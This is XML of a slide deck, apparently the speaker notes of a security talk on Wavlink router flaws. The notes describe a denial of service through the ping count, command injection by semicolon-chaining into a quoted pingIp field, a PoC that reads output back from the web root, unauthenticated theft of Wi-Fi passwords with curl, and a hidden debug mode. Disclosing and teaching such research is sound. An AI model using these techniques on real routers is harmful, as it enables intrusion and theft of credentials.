              <a:t>They are removed from the 2024 version providing further evidence that this was a mistake</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>There is no known api for this router model.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Additionally cgi-bin/api.cgi does not exist</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>It </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>potentially is a drop in file that allows the developers to test some router functionality without having to click around the gui to simulate actions.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>That is my best guess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8343a1f9a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8343a1f9a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winstar is our key /etc/ file</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>All the configuration data is stored here.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Some routers have a giant reliance on NVRAM in order to save configuration data. This does not appear to be the case for wavlink.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This is a great known file path that can be used when attempting to perform LFI or other vulnerability classes.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Quite puzzling the admin password is not hashed at all. Other small SOHO routers still hash their passwords. Such as TPLink. There is no reason why wavlink cannot do the same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8457989ab4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8457989ab4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7e28cfc4aa_1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7e28cfc4aa_1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As a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>developer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> we need to provide the required information to our userbase. However, it is important to not offer any </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>information</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> for free. In otherwords, dont disclose more than you have to.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Exposing the exact model to any unauthenticated user is not necessary. It would be easy to hide that and only disclose module number to an authenticated user.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Almost every router protects the exact firmware version, in my opinion they should do the same for the model number. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>By disclosing the model number it makes it trivial for bad actors to set up automated scanning and exploitation tools</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Exposing the LAN side ip to an unauthenticated user is simply jaw dropping. There is no reason for this, and I have never see that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> any other router. First time for everything</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8343a1f9a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8343a1f9a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shows what an authentication attempt looks like. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>When i was attempting to automate some of the exploitation we will get into i quickly realized that a simple md5 was not accurate and more was </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>occurring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> under the hood.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The get random function chooses a random number and prepends M to the front of the int. This forms the key value. The key value is then prepended to the clear text password and that is then md5 hashed to arrive and the password parameter.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The key is additionally transmitted in the request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router then reads the clear text password out of the winstar config files, performs the same hashing actions that we performed on the client side, and then the hashes are compared.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a very custom system which is something we should always be looking for when performing vulnerability research. Look for the custom developer driven implementations, that is where you are likely to find vulnerabilities.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>That being said, i did not find any bypasses with this POST request. That certainly doesnt mean they dont exist! This is an interesting request that I would like to highlight for further research by you all!</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7e28cfc4aa_1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7e28cfc4aa_1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main router landing page post authentication and on the right is the setup page where all of our fun configuration options live.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7e28cfc4aa_1_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7e28cfc4aa_1_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was delighted to see this page. Its the classic command injection training page, only in a real router. We can land on this page from the setup page.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>It sadly has been removed from the most recent firmware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7e28cfc4aa_1_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7e28cfc4aa_1_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first time i head this statement was in an ippsec video. He was rhetorically asking what can i control here, and that statement has stuck with me ever since.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>I continue to ask myself that same question to this day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two key parameters in this request. pingIp is fairly self </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>explanatory, CCMD is followed by an int value, likely the amount of pings to perform. Lets look to confirm that thesis.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additional note item. The POST is being send to adm.cgi. We will continue to see adm.cgi through out the rest of this presentation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7e28cfc4aa_1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7e28cfc4aa_1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first security issue for wavlink.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We have full control over the CCMD parameter, and there is no validation that occurs in adm.cgi. We can quite </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>literally</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> submit any value, 0 is the most damaging as the ping </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>command</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> will never return. The router will need to be rebooted</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Requests are replayable, thus we can send as many as we wish in Burp or in a python script.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7ed98cb90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7ed98cb90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video shows us altering the CCMD value and changing it to 9999</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>I will show you a clean process list first with no crazy ping commands running. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Changing the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> in the request and sending it </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7ed98cb905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7ed98cb905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switch from 9999 to 0 so the router pings forever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Additionally we show the ability to replay requests.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7e28cfc4aa_1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7e28cfc4aa_1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can certainly do better than this denial of service </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>condition</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>. Before fuzzing I will typically try some manual injection. I like to see how the router responds to different special character in order to inform my fuzzing wordlist</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This was discovered during that initial manual process. I will typically cycle through pipe characters ampersands, semi colons and back ticks.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Again one major emux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>benefit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> is we will always have a stable shell, so detecting blind command injection, like in this case is alot easier. You do not have to rely on the sleep call for initial identification</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7e28cfc4aa_1_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7e28cfc4aa_1_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successful injection is reflected back to us in responses from the server.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This is a great indication that the input was accepted and executed. We can see, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>apologies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> for the weird wordwrap but our ping value of 127.0.0.1 being passed to a larger shell command </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Since quotes are used around the ip address we can get our execution in addition to the ping running successfully. This also explains why the ampersand and pipe characters were not working!</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7ed98cb905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7ed98cb905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this initial POC i wanted to automate this as fast as possible. We are able to semi-colon chain commands together.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Additionally because quotes are used we can chain multiple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>commands</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> together with spaces without messing up the request or the bash command that gets executed under the hood.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The poc i came up with runs user supplied commands and writes the output to a file called diag.txt in the router web root.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>It will then curl the file to retrieve the command output. After that it will then perform the injection again to clean up the temporary text file</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>It is really </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>important</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> to try and leave the router in the exact state we found it when performing command injection.</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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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8343a1f9a7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Classic unsanitized user input</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Easy to fix. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Only allow input of a 0 or a 1</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>If anything else is included, reject it!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8457989ab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8457989ab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have ever had a friend not share their wifi password with you, youre in luck if they have a wavlink router. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This is a very simple "exploit". Its just a curl. Nothing special going on in this poc script. I just grab the values we are interested in off the page and ignore the rest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wizard_ap.shtml page should only be accessible with a valid session cookie from an authenticated user. This is not the case</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>You can simply curl this page in order to get the password and SSID values </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This discloses both the 2.4 and 5Ghz ssid and passwords.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Additionally there is a passphraseKey that is disclosed. Im not sure what this password value is for. From testing it was always the same as the wifi password.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8457989ab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8457989ab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83b65e70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83b65e70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our fourth and last vulnerability for this talk, there is however a cool hidden feature i will show you on the next slide. This is exactly the same as the other two injections. Again adm.cgi is the culprit here</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>There is no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>sanitization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> on the user provided input. The expected POST parameter is either on or off. We can simply tack on our injection input and we are off to the races.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do not have a demo video for this injection, but if you are interested the poc code is in my github repo for this talk.</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83b65e701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83b65e701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thought i had an unauthenticated cmd injection. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Late at night, brain was not working</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>I did not notice until a bit later that my session </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>cookie was still in my request </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Inspired me to reverse engineer login.cgi and adm.cgi</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>I was able to relabel the majority of the login and adm cgi binaries. This made the reverse engineering process much easier.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Sometimes failures can lead to new discoveries</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>I never would have popped the binaries in Ghidra had it not been for this mistake/failure with the phony unauthenticated command injection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Does anyone see something interesting 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Yes that is exactly correct</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This function is just an example this pattern of checking if /tmp/web_log exists and then printing debug logs to the console happens throughout login.cgi and adm.cgi It is not just in this one function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cannot find any talk of this debug mode online, if you do see someone referencing this prior to the date of this talk please let me know so i can give them credit. As it stands right now i believe this is a new discovery.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>I have not confirmed if this exists on other wavlink makes/models. I am inclined to believe that it does!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8343a1f9a7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8343a1f9a7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makes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>future VR so much easier. It takes out alot of the guess work and blind fuzzing.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also eliminates much of the need to load cgi binaries into ghidra! As much as i love reverse engineering it is incredibly time consuming. This can rapidly speed up our VR process and understanding of the router internals.</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8343a1f9a7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8343a1f9a7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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>can't</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> help but feel slightly bummed when leaving a security talk where vulnerabilities are discovered. Like 1% bummed, due to the fact that I incorrectly assume the researcher found it all and I will have to find a new target. Let me tell you that is NOT the case here. There is plenty more attack surface with this specific router model and company as a whole. This slide depicts where I would start looking next…The first depicts a very helpful developer left comment indicating that and exec command is taking place under the hood! Is there some potential for execution here? This image is on line 211 in login.shtml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developers were very helpful leaving comments for us! As you can see there are 777 examples of exec being used in the web root. This is insanity. Are some injectable? Likely. Have I looked at all of them? No, I have likely covered 1% of all these potential injection points. The research is very much ongoing.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7e28cfc4aa_1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7e28cfc4aa_1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/tmp/login struct</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Offset</a:t>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Field</a:t>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Description</a:t>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1400"/>
              <a:t>0x00</a:t>
            </a:r>
            <a:endParaRPr sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1400"/>
              <a:t>0xca64</a:t>
            </a:r>
            <a:endParaRPr sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Magic number (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="188038"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>local_78</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
